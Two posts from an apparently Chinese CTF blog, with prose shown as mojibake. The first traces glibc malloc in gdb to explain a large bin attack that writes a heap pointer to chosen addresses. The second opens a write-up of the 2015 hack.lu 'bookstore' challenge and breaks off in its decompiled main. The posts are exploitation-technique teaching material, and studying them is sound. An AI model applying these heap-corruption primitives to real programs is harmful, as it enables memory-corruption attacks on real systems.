<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p bck</span><br><span class="line">$10 = (mchunkptr) 0x6037a0</span><br><span class="line">gdb-peda$ p victim</span><br><span class="line">$11 = (mchunkptr) 0x6030a0</span><br><span class="line">gdb-peda$ p victim-&gt;bk</span><br><span class="line">$12 = (struct malloc_chunk *) 0x6037a0</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶unsorted biné“¾è¡¨ä¸­å…±æœ‰ä¸¤ä¸ªchunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 â€”â–¸ 0x6030a0 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x6037a0</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå°±å¾ˆå®¹æ˜“ç†è§£æºç ä¸­çš„ä¸¤è¡Œä»£ç ï¼Œå…¶å®å°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªé“¾è¡¨çš„æ›´æ”¹ï¼Œå°†victimä»é“¾è¡¨ä¸­å–äº†å‡ºæ¥</p>
<p>æ‰§è¡Œå®Œ3522</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">3521</span>           <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">   <span class="number">3522</span>           unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line"> â–º <span class="number">3523</span>           bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x6037a0</span> â€”â–¸ <span class="number">0x6030a0</span> â€”â–¸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) â—‚â€” <span class="number">0x6037a0</span></span><br><span class="line">BK: <span class="number">0x6037a0</span> â€”â–¸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) â—‚â€” <span class="number">0x6037a0</span></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œ3523</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x6037a0</span><br></pre></td></tr></table></figure>

<h4 id="å–å‡ºä¹‹å"><a href="#å–å‡ºä¹‹å" class="headerlink" title="å–å‡ºä¹‹å"></a>å–å‡ºä¹‹å</h4><p>ä»unsorted binä¸­å–å‡ºchunkä¹‹åï¼Œå°±å¼€å§‹æ ¹æ®è¿™ä¸ªchunkçš„å¤§å°æ¥åˆ¤æ–­è¦å°†å®ƒæ”¾åˆ°å“ªä¸ªbinä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æˆ‘ä»¬å–å‡ºçš„è¿™ä¸ªchunk(p1)çš„å¤§å°æ˜¯0x330ï¼Œå±äºsmall binèŒƒå›´ï¼Œæ‰€ä»¥è¿›å…¥ifåˆ†æ”¯ï¼Œå°†p1æ”¾åˆ°small binä¸­ã€‚</p>
<p>æ¥ä¸‹æ¥ç¨‹åºé‡å¤ä»¥ä¸Šæ­¥éª¤ï¼š<strong>å–å‡ºunsorted binä¸­çš„æœ€åä¸€ä¸ªchunkï¼Œå¹¶å°†å®ƒæ”¾åˆ°å¯¹åº”çš„binä¸­</strong></p>
<p>é‚£ä¹ˆä¸‹ä¸€ä¸ªè¦å–å‡ºçš„chunkå°±æ˜¯p2ï¼Œå› ä¸ºè¿™ä¸ªchunkå±äºlarge binï¼Œæ‰€ä»¥è¿›å…¥elseåˆ†æ”¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3546</span>           <span class="keyword">else</span></span><br><span class="line">  <span class="number">3547</span>             &#123;</span><br><span class="line">â–º <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br><span class="line">  <span class="number">3550</span>               fwd = bck-&gt;fd;</span><br><span class="line">  <span class="number">3551</span> </span><br><span class="line">  <span class="number">3552</span>               <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">  <span class="number">3553</span>               <span class="keyword">if</span> (fwd != bck)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ­¤æ—¶<code>victim == 0x6037a0</code>ï¼Œ<code>victim-&gt;bk == 0x7ffff7dd1f68 &lt;main_arena+88&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6037a0</span><br><span class="line">0x6037a0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x6037b0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ‰§è¡Œå®Œ3549ä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p bck</span><br><span class="line">$8 = (mchunkptr) 0x7ffff7dd1f68 &lt;main_arena+1096&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°<code>bck</code>ä¸å†ç­‰äº<code>victim-&gt;bk</code>äº†ï¼Œè€Œæ˜¯ç­‰äºå­˜å‚¨å¤§å°ä¸º0x400èŒƒå›´çš„large binçš„è¡¨å¤´æ‰€åœ¨ä½ç½®ï¼Œæ‰€ä»¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤è¡Œä»£ç çš„æ„æ€å…¶å®å°±æ˜¯ç”¨victimçš„sizeå»æ‰¾åˆ°å…¶å±äºå“ªä¸ªlarge binçš„ä¸‹æ ‡ï¼Œç”¨ä¸‹æ ‡å»æ‰¾åˆ°å¯¹åº”çš„large binçš„åœ°å€ï¼Œç„¶åè¿”å›ç»™bck</p>
<p>æ‰€ä»¥<code>bck-&gt;fd</code>å®é™…ä¸Šæ˜¯é‚£ä¸ªå¤§å°çš„<strong>large binä¸­çš„ç¬¬ä¸€ä¸ªchunk</strong>ï¼ˆä¹Ÿå°±æ˜¯é‚£ä¸ªlarge biné“¾è¡¨ä¸­æœ€å¤§çš„chunkï¼‰</p>
<p>ï¼ˆå› ä¸ºæ­¤æ—¶large binä¸­è¿˜æ²¡æœ‰chunkï¼Œæ‰€ä»¥<code>bck-&gt;fd</code>ä¸­ä¿å­˜çš„æ˜¯large binè‡ªèº«çš„åœ°å€ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:	0x00007ffff7dd1f58	0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:	0x00007ffff7dd1f68	0x00007ffff7dd1f68</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬çŸ¥åˆ°äº†<code>fwd</code>æŒ‡çš„æ˜¯ä»€ä¹ˆäº†</p>
<h4 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h4><p>æ¥ä¸‹æ¥è·Ÿç€ç¨‹åºç»§ç»­ï¼Œæ‰§è¡Œåˆ°ç¬¬22è¡Œä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¿®æ”¹äº†å¤„äºlarge binä¸­çš„p2çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œä»¥åŠå°†p3æ”¾åˆ°äº†unsorted binä¸­ã€‚æ¥ä¸‹æ¥å¼€å§‹åˆ†æç¬¬22è¡Œçš„<code>malloc(0x90);</code>è¿™æ¡æŒ‡ä»¤ä¸­ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ã€‚</p>
<p>åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬çŸ¥é“ï¼Œunsorted binä¸­å­˜åœ¨ä¸¤ä¸ªchunkï¼ˆp1ä¸­å‰©ä¸‹çš„é‚£å—ã€p3ï¼‰</p>
<p>é‚£ä¹ˆç¨‹åºæ¥ä¸‹æ¥å°±ä¼šï¼šå–å‡ºunsorted binä¸­çš„æœ€åä¸€ä¸ªchunkï¼Œå°†è¿™å—chunkæ”¾åˆ°å¯¹åº”çš„binä¸­</p>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­ç¬¬ä¸€ä¸ªè¢«å–å‡ºçš„chunkå°±æ˜¯p1å‰²å‰©ä¸‹çš„é‚£å—ï¼Œè¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬ä¸å…³å¿ƒã€‚</p>
<p>ç¬¬äºŒä¸ªè¢«å–å‡ºçš„chunkå°±æ˜¯p3ï¼Œp3å› ä¸ºå±äºlarge binï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå°†p3æ”¾åˆ°large binä¸­</p>
<h5 id="é‡ç‚¹å¼€å§‹"><a href="#é‡ç‚¹å¼€å§‹" class="headerlink" title="é‡ç‚¹å¼€å§‹"></a>é‡ç‚¹å¼€å§‹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3546</span>           <span class="keyword">else</span></span><br><span class="line">  <span class="number">3547</span>             &#123;</span><br><span class="line">  <span class="number">3548</span>               victim_index = largebin_index (size);</span><br><span class="line">  <span class="number">3549</span>               bck = bin_at (av, victim_index);</span><br><span class="line">â–º <span class="number">3550</span>               fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢çš„åˆ†æä¸­æˆ‘ä»¬çŸ¥é“<code>bck</code>æ˜¯large binçš„åœ°å€ï¼Œ<code>fwd</code>æ˜¯è¿™ä¸ªlarge binçš„fdæŒ‡é’ˆæ‰€æŒ‡å‘çš„chunkï¼Œå¯¹äºè¿™é‡Œå°±æ˜¯p2ã€‚</p>
<p>å®Œæˆä¸Šéƒ¨åˆ†ä»£ç ä¹‹åï¼Œè¿›å…¥åˆ°ä¸‹é¢çš„è¿™å—ä»£ç ï¼ˆè¿™å—ä»£ç ç”¨æ¥å°†victimæ’å…¥åˆ°large binä¸­ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)	<span class="comment">//fwd != bckè¯´æ˜large binä¸ä¸ºç©º</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))	<span class="comment">//åˆ¤æ–­victimçš„sizeæ˜¯å¦å°äºlagre binä¸­å·²æœ‰çš„æœ€å°chunkï¼Œå¦‚æœå°äºï¼Œåˆ™ç›´æ¥æ’å…¥åˆ°æœ€å°çš„é‚£ç«¯</span></span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;		<span class="comment">//large bin attack</span></span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)	<span class="comment">//å¦åˆ™ï¼Œé€šè¿‡è¿™ä¸ªå¾ªç¯æ‰¾åˆ°lagre binä¸­æœ€å°çš„å¤§äºvictimçš„chunk</span></span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)	<span class="comment">//å¦‚æœæœ‰å¤§å°æ°å¥½ç›¸ç­‰çš„chunkï¼Œåˆ™ç”¨è¿™ç§æ–¹å¼æ’å…¥ï¼Œæ­¤æ—¶æ— æ³•åˆ©ç”¨</span></span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span>	<span class="comment">//å¦åˆ™æ’å…¥åˆ°nextsizeé“¾è¡¨ä¸­</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;	<span class="comment">//large bin attack</span></span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;		<span class="comment">//large bin attack</span></span><br></pre></td></tr></table></figure>

<p>é€»è¾‘å…¶å®å¾ˆç®€å•ï¼Œç¨å¾®å®¡ä¸€ä¸‹æ¯”å¬åˆ«äººæè¿°è¦ç®€å•ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬å°†<code>fwd</code>çš„sizeä¿®æ”¹å¾—æ¯”<code>victim</code>å°ï¼Œæ‰€ä»¥æœ€åä¼šè¿›å…¥åˆ°ç¬¬29è¡Œå¤„çš„elseåˆ†æ”¯ä¸­.</p>
<p>ç¬¬32è¡Œå°†<code>fwd-&gt;bk_nextsize</code>å†™åˆ°<code>victim-&gt;bk_nextsize</code>ï¼Œç¬¬34è¡Œå°†<code>victim</code>å†™åˆ°<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>ï¼Œä¹Ÿå°±ç›¸å½“äº<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize</code>ï¼Œç”±äºæˆ‘ä»¬ä¿®æ”¹äº†<code>fwd-&gt;bk_nextsize</code>ä¸º<code>&amp;stack_var2 - 4</code>ï¼Œæ‰€ä»¥<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize</code>å°±ç›¸å½“äº<code>*(&amp;stack_var2 - 4 + 4) = stack_var2</code></p>
<p>ç¬¬36è¡Œ<code>bck = fwd-&gt;bk</code>ï¼Œç¬¬47è¡Œ<code>bck-&gt;fd = victim;</code>ï¼Œç»¼åˆèµ·æ¥ç›¸å½“äº<code>fwd-&gt;bk-&gt;fd = victim</code>ï¼Œè€Œæˆ‘ä»¬å°†<code>fwd-&gt;bk</code>ä¿®æ”¹æˆäº†<code>&amp;stack_var1 - 2</code>ï¼Œæ‰€ä»¥<code>fwd-&gt;bk-&gt;fd</code>å°±ç›¸å½“äº<code>*(&amp;stack_var1 - 2 + 2) = stack_var1</code></p>
<p>ç”±ä»¥ä¸Šä¸¤å¤„åˆ©ç”¨æˆ‘ä»¬å®Œæˆäº†å°†<code>victim</code>å†™å…¥åˆ°<code>stack_var1</code>è·Ÿ<code>stack_var2</code>ï¼Œä¹Ÿå°±æ˜¯å°†ä¸€ä¸ªå †åœ°å€å†™å…¥åˆ°ä¸¤ä¸ªåœ°å€å½“ä¸­ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/10/2015-hacklu-bookstore/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/10/2015-hacklu-bookstore/" class="post-title-link" itemprop="url">2015-hacklu-bookstore</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-10 18:03:18" itemprop="dateCreated datePublished" datetime="2022-05-10T18:03:18+08:00">2022-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-11 00:51:22" itemprop="dateModified" datetime="2022-05-11T00:51:22+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å›é¡¾ä¸€ä¸‹fini_arrayçš„å†…å®¹ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯fini_arrayåœ¨RELROåŠå¼€çš„æ—¶å€™å°±ä¸å¯å†™äº†ï¼Œæ‰€ä»¥å…¶åªèƒ½åˆ©ç”¨åœ¨RELROå…¨å…³çš„æƒ…å†µä¸‹ã€‚å› ä¸ºä¸€èˆ¬é¢˜ç›®éƒ½ä¸ä¼šæŠŠRELROå…¨å…³çš„ï¼Œæ‰€ä»¥çœ‹åˆ°ä¸€ä¸ªå…¨å…³çš„æƒ…å†µæˆ–è®¸èƒ½å¾€è¿™æ–¹é¢æƒ³ä¸€ä¸‹ã€‚</p>
<p>è¿™é¢˜çš„éš¾ç‚¹ä¸»è¦åœ¨äºæ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œè¦æƒ³åˆ°åˆ©ç”¨æœ€åçš„å‘v5æŒ‡å‘çš„chunké‡Œå¤åˆ¶å†…å®¹çš„å‡½æ•°æ¥æ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä»¥åŠè¿™ä¸ªå…·ä½“çš„æ­¥éª¤ã€‚å…¶å®å›è¿‡æ¥æƒ³æ¯ä¸€æ­¥éƒ½æ„Ÿè§‰æŒºåˆç†çš„ï¼Œâ€œå› ä¸ºæŸç§æ–¹å¼å¿…å®šèµ°ä¸é€šæ‰€ä»¥åªèƒ½æ˜¯é‚£ç§æ–¹å¼â€çš„è¿™ç§æ€ç»´ã€‚</p>
<p>unsorted binä¸åƒfast binï¼Œä»unsorted binä¸­å–å‡ºchunkæ—¶ä¸ä¼šæœ‰æ‰€æ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©å…ˆå°†æŸä¸ªchunk freeåˆ°unsorted binä¸­ï¼Œå†å»æ”¹å®ƒçš„sizeä½ï¼Œæœ‰æ—¶èƒ½æ¯”è¾ƒçœäº‹</p>
<h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>ç¨‹åºä¿æŠ¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>mainå‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 || !v7 || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; _____          _   _                 _          _                   _ \n&quot;</span></span><br><span class="line">    <span class="string">&quot;/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / /\\/ _ \\ \\/ / __| &#x27;_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| &#x27;__/ _ \\/  /\n&quot;</span></span><br><span class="line">    <span class="string">&quot; / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n&quot;</span></span><br><span class="line">    <span class="string">&quot; \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Crappiest and most expensive books for your college education!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We can order books for you in case they&#x27;re not in stock.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Max. two orders allowed!\n&quot;</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Edit order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Edit order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Delete order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Delete order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5: Submit&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span 